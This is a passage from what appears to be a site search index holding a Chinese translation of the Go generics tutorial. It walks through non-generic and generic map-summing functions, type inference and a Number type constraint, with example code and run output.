\uff0c\u6253\u5370\u5176\u503c\u7684\u603b\u548c\u3002 \u4e0e\u4e0a\u4e00\u8282\u4e00\u6837\uff0c\u5728\u8c03\u7528\u6cdb\u578b\u51fd\u6570\u65f6\u7701\u7565\u4e86\u7c7b\u578b\u53c2\u6570\uff08\u65b9\u62ec\u53f7\u4e2d\u7684\u7c7b\u578b\u540d\u79f0\uff09\u3002Go \u7f16\u8bd1\u5668\u53ef\u4ee5\u4ece\u5176\u4ed6\u53c2\u6570\u63a8\u65ad\u7c7b\u578b\u53c2\u6570\u3002 5.2. \u8fd0\u884c\u4ee3\u7801 \uf0c1 \u4ece\u5305\u542b main.go \u7684\u76ee\u5f55\u4e2d\u7684\u547d\u4ee4\u884c\uff0c\u8fd0\u884c\u4ee3\u7801\u3002 $ go run . Non-Generic Sums: 46 and 62.97 Generic Sums: 46 and 62.97 Generic Sums, type parameters inferred: 46 and 62.97 Generic Sums with Constraint: 46 and 62.97 \u7ed3\u8bba \uf0c1 \u505a\u5f97\u5f88\u597d\uff01\u60a8\u521a\u521a\u5411\u81ea\u5df1\u4ecb\u7ecd\u4e86 Go \u4e2d\u7684\u6cdb\u578b\u3002 \u5efa\u8bae\u7684\u4e0b\u4e00\u4e2a\u4e3b\u9898\uff1a Go Tour \u662f\u5bf9 Go \u57fa\u7840\u77e5\u8bc6\u7684\u9010\u6b65\u4ecb\u7ecd\u3002 \u60a8\u5c06\u5728 Effective Go \u548c How to write Go code \u4e2d\u627e\u5230\u6709\u7528\u7684 Go \u6700\u4f73\u5b9e\u8df5\u3002 \u5b8c\u6574\u7684\u4ee3\u7801 \uf0c1 \u4f60\u53ef\u4ee5\u5728 Go playground \u4e0a\u8fd0\u884c\u8fd9\u4e2a\u7a0b\u5e8f \u3002\u5728\u64cd\u573a(playground)\u4e0a\uff0c\u53ea\u9700\u5355\u51fb\u201c Run \u201d\u6309\u94ae\u3002 package main import \"fmt\" type Number interface { int64 | float64 } func main() { // Initialize a map for the integer values ints := map[string]int64{ \"first\": 34, \"second\": 12, } // Initialize a map for the float values floats := map[string]float64{ \"first\": 35.98, \"second\": 26.99, } fmt.Printf(\"Non-Generic Sums: %v and %v\\n\", SumInts(ints), SumFloats(floats)) fmt.Printf(\"Generic Sums: %v and %v\\n\", SumIntsOrFloats[string, int64](ints), SumIntsOrFloats[string, float64](floats)) fmt.Printf(\"Generic Sums, type parameters inferred: %v and %v\\n\", SumIntsOrFloats(ints), SumIntsOrFloats(floats)) fmt.Printf(\"Generic Sums with Constraint: %v and %v\\n\", SumNumbers(ints), SumNumbers(floats)) } // SumInts adds together the values of m. func SumInts(m map[string]int64) int64 { var s int64 for _, v := range m { s += v } return s } // SumFloats adds together the values of m. func SumFloats(m map[string]float64) float64 { var s float64 for _, v := range m { s += v } return s } // SumIntsOrFloats sums the values of map m. It supports both floats and integers // as map values. func SumIntsOrFloats[K comparable, V int64 | float64](m map[K]V) V { var s V for _, v := range m { s += v } return s } // SumNumbers sums the values of map m. Its supports both integers // and floats as map values. func SumNumbers[K comparable, V Number](m map[K]V) V { var s V for _, v := range m { s += v } return s } \u53c2\u8003\u8d44\u6599 \uf0c1 https://go.dev/doc/tutorial/generics","title":"Generics"},{"location":"go/generics/#getting-started-with-generics","text":"\u672c\u6559\u7a0b\u4ecb\u7ecd Go \u4e2d\u6cdb\u578b\u7684\u57fa\u7840\u77e5\u8bc6\u3002\u4f7f\u7528\u6cdb\u578b\uff0c\u60a8\u53ef\u4ee5\u4e3a\u8c03\u7528\u4ee3\u7801\u58f0\u660e\u548c\u4f7f\u7528\u7684\u51fd\u6570\u6216\u7c7b\u578b\u7f16\u5199\u63d0\u4f9b\u4efb\u4f55\u4e00\u7ec4\u7c7b\u578b\u3002 \u5728\u672c\u6559\u7a0b\u4e2d\uff0c\u60a8\u5c06\u58f0\u660e\u4e24\u4e2a\u7b80\u5355\u7684\u975e\u6cdb\u578b\u51fd\u6570\uff0c\u7136\u540e\u5728\u5355\u4e2a\u6cdb\u578b\u51fd\u6570\u4e2d\u6355\u83b7\u76f8\u540c\u7684\u903b\u8f91\u3002 \u60a8\u5c06\u9010\u6b65\u5b8c\u6210\u4ee5\u4e0b\u90e8\u5206\uff1a \u4e3a\u60a8\u7684\u4ee3\u7801\u521b\u5efa\u4e00\u4e2a\u6587\u4ef6\u5939\u3002 \u6dfb\u52a0\u975e\u6cdb\u578b\u51fd\u6570\u3002 \u6dfb\u52a0\u4e00\u4e2a\u6cdb\u578b\u51fd\u6570\u6765\u5904\u7406\u591a\u79cd\u7c7b\u578b\u3002 \u8c03\u7528\u6cdb\u578b\u51fd\u6570\u65f6\u5220\u9664\u7c7b\u578b\u53c2\u6570\u3002 \u58f0\u660e\u7c7b\u578b\u7ea6\u675f\u3002 \u6ce8\u610f \uff1a\u5982\u679c\u60a8\u613f\u610f\uff0c\u53ef\u4ee5\u4f7f\u7528 \u201cGo dev branch\u201d\u6a21\u5f0f\u4e0b\u7684 Go Playground \u6765\u7f16\u8f91\u548c\u8fd0\u884c\u60a8\u7684\u7a0b\u5e8f\u3002 Go 1.18 \u6216\u66f4\u9ad8\u7248\u672c","title":"\u6cdb\u578b\u5165\u95e8"},{"location":"go/generics/#create-folder-for-code","text":"\u9996\u5148\uff0c\u4e3a\u60a8\u8981\u7f16\u5199\u7684\u4ee3\u7801\u521b\u5efa\u4e00\u4e2a\u6587\u4ef6\u5939\u3002 \u6253\u5f00\u547d\u4ee4\u63d0\u793a\u7b26\u5e76\u5207\u6362\u5230\u60a8\u7684\u4e3b\u76ee\u5f55\u3002 \u5728\u547d\u4ee4\u63d0\u793a\u7b26\u4e0b\uff0c\u4e3a\u60a8\u7684\u4ee3\u7801\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a generics \u7684\u76ee\u5f55\u3002 $ mkdir generics $ cd generics \u521b\u5efa\u4e00\u4e2a\u6a21\u5757\u6765\u4fdd\u5b58\u60a8\u7684\u4ee3\u7801\u3002 \u8fd0\u884c go mod init \u547d\u4ee4\uff0c\u4e3a\u5176\u63d0\u4f9b\u65b0\u4ee3\u7801\u7684\u6a21\u5757\u8def\u5f84\u3002 $ go mod init example/generics go: creating new go.mod: module example/generics \u6ce8\u610f\uff1a\u5bf9\u4e8e\u751f\u4ea7\u4ee3\u7801\uff0c\u60a8\u9700\u8981\u6307\u5b9a\u4e00\u4e2a\u66f4\u7b26\u5408\u60a8\u81ea\u5df1\u9700\u6c42\u7684\u6a21\u5757\u8def\u5f84\u3002\u6709\u5173\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u52a1\u5fc5\u67e5\u770b \u7ba1\u7406\u4f9d\u8d56\u9879 \u3002 \u63a5\u4e0b\u6765\uff0c\u60a8\u5c06\u6dfb\u52a0\u4e00\u4e9b\u7b80\u5355\u7684\u4ee3\u7801\u6765\u5904\u7406 map\u3002","title":"1. \u4e3a\u60a8\u7684\u4ee3\u7801\u521b\u5efa\u4e00\u4e2a\u6587\u4ef6\u5939"},{"location":"go/generics/#non-generic-functions","text":"\u5728\u6b64\u6b65\u9aa4\u4e2d\uff0c\u60a8\u5c06\u6dfb\u52a0\u4e24\u4e2a\u51fd\u6570\uff0c\u6bcf\u4e2a\u51fd\u6570\u5c06 map \u7684\u503c\u76f8\u52a0\u5e76\u8fd4\u56de\u603b\u6570\u3002 \u60a8\u8981\u58f0\u660e\u4e24\u4e2a\u51fd\u6570\u800c\u4e0d\u662f\u4e00\u4e2a\uff0c\u56e0\u4e3a\u60a8\u6b63\u5728\u4f7f\u7528\u4e24\u79cd\u4e0d\u540c\u7c7b\u578b\u7684 map\uff1a\u4e00\u79cd\u7528\u4e8e\u5b58\u50a8 int64 \u503c\uff0c\u53e6\u4e00\u79cd\u7528\u4e8e\u5b58\u50a8 float64 \u503c\u3002","title":"2. \u6dfb\u52a0\u975e\u6cdb\u578b\u51fd\u6570"},{"location":"go/generics/#write-code-21","text":"\u4f7f\u7528\u60a8\u7684\u6587\u672c\u7f16\u8f91\u5668\uff0c\u5728 generics \u76ee\u5f55\u4e2d\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a main.go \u7684\u6587\u4ef6\u3002\u60a8\u5c06\u5728\u6b64\u6587\u4ef6\u4e2d\u7f16\u5199\u60a8\u7684 Go \u4ee3\u7801\u3002 \u8fdb\u5165 main.go\uff0c\u5728\u6587\u4ef6\u9876\u90e8\uff0c\u7c98\u8d34\u4ee5\u4e0b\u5305\u58f0\u660e\u3002 package main \u72ec\u7acb\u7a0b\u5e8f\uff08\u4e0e\u5e93\u76f8\u53cd\uff09\u59cb\u7ec8\u4f4d\u4e8e package main \u4e2d\u3002 \u5728\u5305\u58f0\u660e\u4e0b\u65b9\uff0c\u7c98\u8d34\u4ee5\u4e0b\u4e24\u4e2a\u51fd\u6570\u58f0\u660e\u3002 // SumInts adds together the values of m. func SumInts(m map[string]int64) int64 { var s int64 for _, v := range m { s += v } return s } // SumFloats adds together the values of m. func SumFloats(m map[string]float64) float64 { var s float64 for _, v := range m { s += v } return s } \u5728\u6b64\u4ee3\u7801\u4e2d\uff0c\u60a8\uff1a \u58f0\u660e\u4e24\u4e2a\u51fd\u6570\u4ee5\u5c06map\u7684\u503c\u76f8\u52a0\u5e76\u8fd4\u56de\u603b\u548c\u3002 SumFloats \u83b7\u53d6 string \u5230 float64 \u503c\u7684map\u6620\u5c04\u3002 SumInts \u83b7\u53d6 string \u5230 int64 \u503c\u7684map\u6620\u5c04\u3002 \u5728 main.go \u9876\u90e8\u7684\u5305\u58f0\u660e\u4e0b\u65b9\uff0c\u7c98\u8d34\u4ee5\u4e0b main \u51fd\u6570\u4ee5\u521d\u59cb\u5316\u4e24\u4e2a\u6620\u5c04\uff0c\u5e76\u5728\u8c03\u7528\u60a8\u5728\u4e0a\u4e00\u6b65\u4e2d\u58f0\u660e\u7684\u51fd\u6570\u65f6\u5c06\u5b83\u4eec\u7528\u4f5c\u53c2\u6570\u3002 func main() { // Initialize a map for the integer values ints := map[string]int64{ \"first\": 34, \"second\": 12, } // Initialize a map for the float values floats := map[string]float64{ \"first\": 35.98, \"second\": 26.99, } fmt.Printf(\"Non-Generic Sums: %v and %v\\n\", SumInts(ints), SumFloats(floats)) } \u5728\u6b64\u4ee3\u7801\u4e2d\uff0c\u60a8\uff1a \u521d\u59cb\u5316\u4e00\u4e2a float64 \u503cmap\u6620\u5c04\u548c\u4e00\u4e2a int64 \u503cmap\u6620\u5c04\uff0c\u6bcf\u4e2a\u90fd\u6709\u4e24\u4e2a\u6761\u76ee\u3002 \u8c03\u7528\u60a8\u4e4b\u524d\u58f0\u660e\u7684\u4e24\u4e2a\u51fd\u6570\u6765\u67e5\u627e\u6bcf\u4e2a\u6620\u5c04\u503c\u7684\u603b\u548c\u3002 \u6253\u5370\u7ed3\u679c\u3002 \u5728 main.go \u9876\u90e8\u9644\u8fd1\uff0c\u5c31\u5728\u5305\u58f0\u660e\u7684\u4e0b\u65b9\uff0c\u5bfc\u5165\u60a8\u9700\u8981\u652f\u6301\u60a8\u521a\u521a\u7f16\u5199\u7684\u4ee3\u7801\u7684\u5305\u3002 \u7b2c\u4e00\u884c\u4ee3\u7801\u5e94\u5982\u4e0b\u6240\u793a\uff1a package main import \"fmt\" \u4fdd\u5b58 main.go\u3002","title":"2.1. \u7f16\u5199\u4ee3\u7801"},{"location":"go/generics/#run-code-21","text":"\u4ece\u5305\u542b main.go \u7684\u76ee\u5f55\u4e2d\u7684\u547d\u4ee4\u884c\uff0c\u8fd0\u884c\u4ee3\u7801\u3002 $ go run . Non-Generic Sums: 46 and 62.97 \u4f7f\u7528\u6cdb\u578b\uff0c\u60a8\u53ef\u4ee5\u5728\u6b64\u5904\u7f16\u5199\u4e00\u4e2a\u51fd\u6570\u800c\u4e0d\u662f\u4e24\u4e2a\u3002\u63a5\u4e0b\u6765\uff0c\u60a8\u5c06\u4e3a\u5305\u542b\u6574\u6570\u6216\u6d6e\u70b9\u503c\u7684map\u6620\u5c04\u6dfb\u52a0\u4e00\u4e2a\u6cdb\u578b\u51fd\u6570\u3002","title":"2.2. \u8fd0\u884c\u4ee3\u7801"},{"location":"go/generics/#add-generic-function","text":"\u5728\u672c\u8282\u4e2d\uff0c\u60a8\u5c06\u6dfb\u52a0\u4e00\u4e2a\u6cdb\u578b\u51fd\u6570\uff0c\u8be5\u51fd\u6570\u53ef\u4ee5\u63a5\u6536\u5305\u542b\u6574\u6570\u6216\u6d6e\u70b9\u503c\u7684map\u6620\u5c04\uff0c\u4ece\u800c\u6709\u6548\u5730\u5c06\u60a8\u521a\u521a\u7f16\u5199\u7684\u4e24\u4e2a\u51fd\u6570\u66ff\u6362\u4e3a\u4e00\u4e2a\u51fd\u6570\u3002 \u8981\u652f\u6301\u4efb\u4e00\u7c7b\u578b\u7684\u503c\uff0c\u8be5\u5355\u4e2a\u51fd\u6570\u5c06\u9700\u8981\u4e00\u79cd\u65b9\u6cd5\u6765\u58f0\u660e\u5b83\u652f\u6301\u7684\u7c7b\u578b\u3002\u53e6\u4e00\u65b9\u9762\uff0c\u8c03\u7528\u4ee3\u7801\u9700\u8981\u4e00\u79cd\u65b9\u6cd5\u6765\u6307\u5b9a\u5b83\u662f\u4f7f\u7528\u6574\u6570map\u8fd8\u662f\u6d6e\u70b9map\u3002 \u4e3a\u4e86\u652f\u6301\u8fd9\u4e00\u70b9\uff0c\u60a8\u5c06\u7f16\u5199\u4e00\u4e2a\u51fd\u6570\uff0c\u8be5\u51fd\u6570\u5728\u5176\u666e\u901a\u51fd\u6570\u53c2\u6570\u4e4b\u5916\u8fd8\u58f0\u660e \u7c7b\u578b\u53c2\u6570 (type parameters)\u3002\u8fd9\u4e9b\u7c7b\u578b\u53c2\u6570\u4f7f\u51fd\u6570\u5177\u6709\u901a\u7528\u6027\uff0c\u4f7f\u5176\u80fd\u591f\u5904\u7406\u4e0d\u540c\u7c7b\u578b\u7684\u53c2\u6570\u3002\u60a8\u5c06\u4f7f\u7528\u7c7b\u578b\u53c2\u6570\u548c\u666e\u901a\u51fd\u6570\u53c2\u6570\u8c03\u7528\u8be5\u51fd\u6570\u3002 \u6bcf\u4e2a\u7c7b\u578b\u53c2\u6570\u90fd\u6709\u4e00\u4e2a \u7c7b\u578b\u7ea6\u675f (type constraint)\uff0c\u5b83\u5145\u5f53\u7c7b\u578b\u53c2\u6570\u7684\u4e00\u79cd\u5143\u7c7b\u578b(meta-type)\u3002\u6bcf\u4e2a\u7c7b\u578b\u7ea6\u675f\u6307\u5b9a\u8c03\u7528\u4ee3\u7801\u53ef\u7528\u4e8e\u76f8\u5e94\u7c7b\u578b\u53c2\u6570\u7684\u5141\u8bb8\u7c7b\u578b\u53c2\u6570\u3002 \u867d\u7136\u7c7b\u578b\u53c2\u6570\u7684\u7ea6\u675f\u901a\u5e38\u8868\u793a\u4e00\u7ec4\u7c7b\u578b\uff0c\u4f46\u5728\u7f16\u8bd1\u65f6\uff0c\u7c7b\u578b\u53c2\u6570\u4ee3\u8868\u5355\u4e00\u7c7b\u578b\u2014\u2014\u8c03\u7528\u4ee3\u7801\u4f5c\u4e3a\u7c7b\u578b\u53c2\u6570\u63d0\u4f9b\u7684\u7c7b\u578b\u3002\u5982\u679c\u7c7b\u578b\u53c2\u6570\u7684\u7ea6\u675f\u4e0d\u5141\u8bb8\u7c7b\u578b\u53c2\u6570\u7684\u7c7b\u578b\uff0c\u5219\u4ee3\u7801\u5c06\u65e0\u6cd5\u7f16\u8bd1\u3002 \u8bf7\u8bb0\u4f4f\uff0c\u7c7b\u578b\u53c2\u6570\u5fc5\u987b\u652f\u6301\u6cdb\u578b\u4ee3\u7801\u5bf9\u5176\u6267\u884c\u7684\u6240\u6709\u64cd\u4f5c\u3002\u4f8b\u5982\uff0c\u5982\u679c\u60a8\u7684\u51fd\u6570\u4ee3\u7801\u5c1d\u8bd5\u5bf9\u5176\u7ea6\u675f\u7c7b\u578b\u5305\u62ec\u6570\u5b57\u7c7b\u578b\u7684\u7c7b\u578b\u53c2\u6570\u6267\u884c string \u64cd\u4f5c\uff08\u4f8b\u5982\u7d22\u5f15\uff09\uff0c\u5219\u4ee3\u7801\u5c06\u65e0\u6cd5\u7f16\u8bd1\u3002 \u5728\u60a8\u5373\u5c06\u7f16\u5199\u7684\u4ee3\u7801\u4e2d\uff0c\u60a8\u5c06\u4f7f\u7528\u5141\u8bb8\u6574\u6570\u6216\u6d6e\u70b9\u7c7b\u578b\u7684\u7ea6\u675f\u3002","title":"3. \u6dfb\u52a0\u6cdb\u578b\u51fd\u6570\u5904\u7406\u591a\u79cd\u7c7b\u578b"},{"location":"go/generics/#write-code-31","text":"\u5728\u60a8\u4e4b\u524d\u6dfb\u52a0\u7684\u4e24\u4e2a\u51fd\u6570\u4e0b\u65b9\uff0c\u7c98\u8d34\u4ee5\u4e0b\u6cdb\u578b\u51fd\u6570\u3002 // SumIntsOrFloats sums the values of map m. It supports both int64 and float64 // as types for map values. func SumIntsOrFloats[K comparable, V int64 | float64](m map[K]V) V { var s V for _, v := range m { s += v } return s } \u5728\u6b64\u4ee3\u7801\u4e2d\uff0c\u60a8\uff1a \u58f0\u660e\u4e00\u4e2a SumIntsOrFloats \u51fd\u6570\u5177\u6709\u4e24\u4e2a\u7c7b\u578b\u53c2\u6570\uff08\u5728\u65b9\u62ec\u53f7\u5185\uff09 K \u548c V \uff0c\u4ee5\u53ca\u4e00\u4e2a\u4f7f\u7528\u7c7b\u578b\u53c2\u6570\u7684\u53c2\u6570 m \uff0c\u7c7b\u578b\u4e3a map[K]V \u3002\u8be5\u51fd\u6570\u8fd4\u56de\u4e00\u4e2a V \u7c7b\u578b\u7684\u503c\u3002 \u4e3a K \u7c7b\u578b\u53c2\u6570\u6307\u5b9a\u7c7b\u578b\u7ea6\u675f comparable \u3002\u4e13\u95e8\u9488\u5bf9\u6b64\u7c7b\u60c5\u51b5\uff0c\u5728 Go \u4e2d\u9884\u5148\u58f0\u660e\u4e86\u7ea6\u675f comparable \u3002\u5b83\u5141\u8bb8\u503c\u53ef\u4ee5\u7528\u4f5c\u6bd4\u8f83\u8fd0\u7b97\u7b26 == \u548c != \u7684\u64cd\u4f5c\u6570\u7684\u4efb\u4f55\u7c7b\u578b\u3002Go \u8981\u6c42map\u6620\u5c04\u7684keys\u5177\u6709\u53ef\u6bd4\u6027\u3002\u6240\u4ee5\u58f0\u660e K \u4e3a ascomparable \u662f\u5fc5\u8981\u7684\uff0c\u8fd9\u6837\u60a8\u5c31\u53ef\u4ee5\u4f7f\u7528 K \u5728 map \u53d8\u91cf\u4e2d\u4f5c\u4e3akey\u952e\u3002\u5b83\u8fd8\u786e\u4fdd\u8c03\u7528\u4ee3\u7801\u5bf9\u6620\u5c04\u952e\u4f7f\u7528\u5141\u8bb8\u7684\u7c7b\u578b\u3002 \u4e3a V \u7c7b\u578b\u53c2\u6570\u6307\u5b9a\u4e00\u4e2a\u7ea6\u675f\uff0c\u5b83\u662f\u4e24\u79cd\u7c7b\u578b\u7684\u8054\u5408\uff1a int64 \u548c float64 \u3002\u4f7f\u7528 | \u6307\u5b9a\u4e24\u79cd\u7c7b\u578b\u7684\u8054\u5408\uff0c\u8fd9\u610f\u5473\u7740\u6b64\u7ea6\u675f\u5141\u8bb8\u4efb\u4f55\u4e00\u79cd\u7c7b\u578b\u3002\u7f16\u8bd1\u5668\u5c06\u5141\u8bb8\u4efb\u4e00\u7c7b\u578b\u4f5c\u4e3a\u8c03\u7528\u4ee3\u7801\u4e2d\u7684\u53c2\u6570\u3002 \u6307\u5b9a\u53c2\u6570 m \u7c7b\u578b\u662f map[K]V \uff0c\u5176\u4e2d K \u548c V \u662f\u5df2\u7ecf\u4e3a\u7c7b\u578b\u53c2\u6570\u6307\u5b9a\u7684\u7c7b\u578b\u3002\u8bf7\u6ce8\u610f\uff0c\u6211\u4eec\u77e5\u9053 map[K]V \u662f\u6709\u6548\u7684map\u7c7b\u578b\uff0c\u56e0\u4e3a K \u662f\u53ef\u6bd4\u8f83\u7684\u7c7b\u578b\u3002\u5982\u679c\u6211\u4eec\u6ca1\u6709\u58f0\u660e K \u53ef\u6bd4\u8f83\uff0c\u7f16\u8bd1\u5668\u5c06\u62d2\u7edd map[K]V \u952e\u503c\u5bf9. \u5728 main.go \u4e2d\uff0c\u5728\u60a8\u5df2\u6709\u7684\u4ee3\u7801\u4e0b\u65b9\uff0c\u7c98\u8d34\u4ee5\u4e0b\u4ee3\u7801\u3002 fmt.Printf(\"Generic Sums: %v and %v\\n\", SumIntsOrFloats[string, int64](ints), SumIntsOrFloats[string, float64](floats)) \u5728\u6b64\u4ee3\u7801\u4e2d\uff0c\u60a8\uff1a \u8c03\u7528\u60a8\u521a\u521a\u58f0\u660e\u7684\u901a\u7528\u51fd\u6570\uff0c\u4f20\u9012\u60a8\u521b\u5efa\u7684\u6bcf\u4e2a\u6620\u5c04\u3002 \u6307\u5b9a\u7c7b\u578b\u53c2\u6570 - \u65b9\u62ec\u53f7\u4e2d\u7684\u7c7b\u578b\u540d\u79f0 - \u4ee5\u660e\u786e\u5e94\u8be5\u66ff\u6362\u60a8\u6b63\u5728\u8c03\u7528\u7684\u51fd\u6570\u4e2d\u7684\u7c7b\u578b\u53c2\u6570\u7684\u7c7b\u578b\u3002 \u6b63\u5982\u60a8\u5c06\u5728\u4e0b\u4e00\u8282\u4e2d\u770b\u5230\u7684\uff0c\u60a8\u901a\u5e38\u53ef\u4ee5\u5728\u51fd\u6570\u8c03\u7528\u4e2d\u7701\u7565\u7c7b\u578b\u53c2\u6570\u3002Go \u901a\u5e38\u53ef\u4ee5\u4ece\u4f60\u7684\u4ee3\u7801\u4e2d\u63a8\u65ad\u51fa\u5b83\u4eec\u3002 \u6253\u5370\u51fd\u6570\u8fd4\u56de\u7684\u603b\u548c\u3002","title":"3.1. \u7f16\u5199\u4ee3\u7801"},{"location":"go/generics/#run-code-32","text":"\u4ece\u5305\u542b main.go \u7684\u76ee\u5f55\u4e2d\u7684\u547d\u4ee4\u884c\uff0c\u8fd0\u884c\u4ee3\u7801\u3002 $ go run . Non-Generic Sums: 46 and 62.97 Generic Sums: 46 and 62.97 \u4e3a\u4e86\u8fd0\u884c\u60a8\u7684\u4ee3\u7801\uff0c\u5728\u6bcf\u6b21\u8c03\u7528\u4e2d\uff0c\u7f16\u8bd1\u5668\u5c06\u7c7b\u578b\u53c2\u6570\u66ff\u6362\u4e3a\u8be5\u8c03\u7528\u4e2d\u6307\u5b9a\u7684\u5177\u4f53\u7c7b\u578b\u3002 \u5728\u8c03\u7528\u60a8\u7f16\u5199\u7684\u6cdb\u578b\u51fd\u6570\u65f6\uff0c\u60a8\u6307\u5b9a\u4e86\u7c7b\u578b\u53c2\u6570\uff0c\u544a\u8bc9\u7f16\u8bd1\u5668\u4f7f\u7528\u4ec0\u4e48\u7c7b\u578b\u4ee3\u66ff\u51fd\u6570\u7684\u7c7b\u578b\u53c2\u6570\u3002\u6b63\u5982\u60a8\u5c06\u5728\u4e0b\u4e00\u8282\u4e2d\u770b\u5230\u7684\uff0c\u5728\u8bb8\u591a\u60c5\u51b5\u4e0b\u60a8\u53ef\u4ee5\u7701\u7565\u8fd9\u4e9b\u7c7b\u578b\u53c2\u6570\uff0c\u56e0\u4e3a\u7f16\u8bd1\u5668\u53ef\u4ee5\u63a8\u65ad\u5b83\u4eec\u3002","title":"3.2. \u8fd0\u884c\u4ee3\u7801"},{"location":"go/generics/#calling-generic-function","text":"\u5728\u672c\u8282\u4e2d\uff0c\u60a8\u5c06\u6dfb\u52a0\u6cdb\u578b\u51fd\u6570\u8c03\u7528\u7684\u4fee\u6539\u7248\u672c\uff0c\u8fdb\u884c\u5c0f\u7684\u66f4\u6539\u4ee5\u7b80\u5316\u8c03\u7528\u4ee3\u7801\u3002\u60a8\u5c06\u5220\u9664\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\u4e0d\u9700\u8981\u7684\u7c7b\u578b\u53c2\u6570\u3002 \u5f53 Go \u7f16\u8bd1\u5668\u53ef\u4ee5\u63a8\u65ad\u60a8\u8981\u4f7f\u7528\u7684\u7c7b\u578b\u65f6\uff0c\u60a8\u53ef\u4ee5\u5728\u8c03\u7528\u4ee3\u7801\u4e2d\u7701\u7565\u7c7b\u578b\u53c2\u6570\u3002\u7f16\u8bd1\u5668\u4ece\u51fd\u6570\u53c2\u6570\u7684\u7c7b\u578b\u63a8\u65ad\u7c7b\u578b\u53c2\u6570\u3002 \u8bf7\u6ce8\u610f\uff0c\u8fd9\u5e76\u4e0d\u603b\u662f\u53ef\u80fd\u7684\u3002\u4f8b\u5982\uff0c\u5982\u679c\u60a8\u9700\u8981\u8c03\u7528\u6ca1\u6709\u53c2\u6570\u7684\u6cdb\u578b\u51fd\u6570\uff0c\u5219\u9700\u8981\u5728\u51fd\u6570\u8c03\u7528\u4e2d\u5305\u542b\u7c7b\u578b\u53c2\u6570\u3002","title":"4. \u7b80\u5316\u8c03\u7528\u6cdb\u578b\u51fd\u6570"},{"location":"go/generics/#write-code-41","text":"\u5728 main.go \u4e2d\uff0c\u5728\u60a8\u5df2\u6709\u7684\u4ee3\u7801\u4e0b\u65b9\uff0c\u7c98\u8d34\u4ee5\u4e0b\u4ee3\u7801\u3002 fmt.Printf(\"Generic Sums, type parameters inferred: %v and %v\\n\", SumIntsOrFloats(ints), SumIntsOrFloats(floats)) \u5728\u6b64\u4ee3\u7801\u4e2d\uff0c\u60a8\uff1a \u8c03\u7528\u6cdb\u578b\u51fd\u6570\uff0c\u7701\u7565\u7c7b\u578b\u53c2\u6570\u3002","title":"4.1. \u7f16\u5199\u4ee3\u7801"},{"location":"go/generics/#run-code-42","text":"\u4ece\u5305\u542b main.go \u7684\u76ee\u5f55\u4e2d\u7684\u547d\u4ee4\u884c\uff0c\u8fd0\u884c\u4ee3\u7801\u3002 $ go run . Non-Generic Sums: 46 and 62.97 Generic Sums: 46 and 62.97 Generic Sums, type parameters inferred: 46 and 62.97 \u63a5\u4e0b\u6765\uff0c\u60a8\u5c06\u901a\u8fc7\u5c06\u6574\u6570\u548c\u6d6e\u70b9\u6570\u7684\u5e76\u96c6\u6355\u83b7\u5230\u60a8\u53ef\u4ee5\u91cd\u7528\u7684\u7c7b\u578b\u7ea6\u675f\uff08\u4f8b\u5982\u4ece\u5176\u4ed6\u4ee3\u7801\u4e2d\uff09\u6765\u8fdb\u4e00\u6b65\u7b80\u5316\u51fd\u6570\u3002","title":"4.2. \u8fd0\u884c\u4ee3\u7801"},{"location":"go/generics/#declare-type-constraint","text":"\u5728\u6700\u540e\u4e00\u90e8\u5206\u4e2d\uff0c\u60a8\u5c06\u628a\u4e4b\u524d\u5b9a\u4e49\u7684\u7ea6\u675f\u79fb\u5230\u5b83\u81ea\u5df1\u7684\u63a5\u53e3\u4e2d\uff0c\u4ee5\u4fbf\u60a8\u53ef\u4ee5\u5728\u591a\u4e2a\u5730\u65b9\u91cd\u7528\u5b83\u3002\u4ee5\u8fd9\u79cd\u65b9\u5f0f\u58f0\u660e\u7ea6\u675f\u6709\u52a9\u4e8e\u7b80\u5316\u4ee3\u7801\uff0c\u4f8b\u5982\u5f53\u7ea6\u675f\u66f4\u590d\u6742\u65f6\u3002 \u60a8\u5c06 \u7c7b\u578b\u7ea6\u675f \u58f0\u660e\u4e3a\u63a5\u53e3\u3002\u7ea6\u675f\u5141\u8bb8\u4efb\u4f55\u7c7b\u578b\u5b9e\u73b0\u63a5\u53e3\u3002\u4f8b\u5982\uff0c\u5982\u679c\u60a8\u58f0\u660e\u4e86\u5177\u6709\u4e09\u4e2a\u65b9\u6cd5\u7684\u7c7b\u578b\u7ea6\u675f\u63a5\u53e3\uff0c\u7136\u540e\u5728\u6cdb\u578b\u51fd\u6570\u4e2d\u5c06\u5176\u4e0e\u7c7b\u578b\u53c2\u6570\u4e00\u8d77\u4f7f\u7528\uff0c\u5219\u7528\u4e8e\u8c03\u7528\u8be5\u51fd\u6570\u7684\u7c7b\u578b\u53c2\u6570\u5fc5\u987b\u5177\u6709\u6240\u6709\u8fd9\u4e9b\u65b9\u6cd5\u3002 \u6b63\u5982\u60a8\u5c06\u5728\u672c\u8282\u4e2d\u770b\u5230\u7684\uff0c\u7ea6\u675f\u63a5\u53e3\u4e5f\u53ef\u4ee5\u5f15\u7528\u7279\u5b9a\u7c7b\u578b\u3002","title":"5. \u58f0\u660e\u7c7b\u578b\u7ea6\u675f"},{"location":"go/generics/#write-code-51","text":"\u5c31\u5728main\u4e0a\u9762\uff0c\u7d27\u8ddf\u5728 import \u8bed\u53e5\u4e4b\u540e\uff0c\u7c98\u8d34\u4ee5\u4e0b\u4ee3\u7801\u6765\u58f0\u660e\u7c7b\u578b\u7ea6\u675f\u3002 type Number interface { int64 | float64 } \u5728\u6b64\u4ee3\u7801\u4e2d\uff0c\u60a8\uff1a \u58f0\u660e Number \u8981\u7528\u4f5c\u7c7b\u578b\u7ea6\u675f\u7684\u63a5\u53e3\u7c7b\u578b\u3002 \u5728\u63a5\u53e3\u5185\u90e8\u58f0\u660e\u4e00\u4e2a int64 \u548c float64 \u7684\u5e76\u96c6(union)\u3002 \u672c\u8d28\u4e0a\uff0c\u60a8\u6b63\u5728\u5c06\u8054\u5408(union)\u4ece\u51fd\u6570\u58f0\u660e\u79fb\u52a8\u5230\u65b0\u7684\u7c7b\u578b\u7ea6\u675f\u4e2d\u3002\u8fd9\u6837\u4e00\u6765\uff0c\u5f53\u60a8\u60f3\u5c06\u7c7b\u578b\u53c2\u6570\u7ea6\u675f\u4e3a int64 \u6216 float64 \u65f6\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528\u6b64 Number 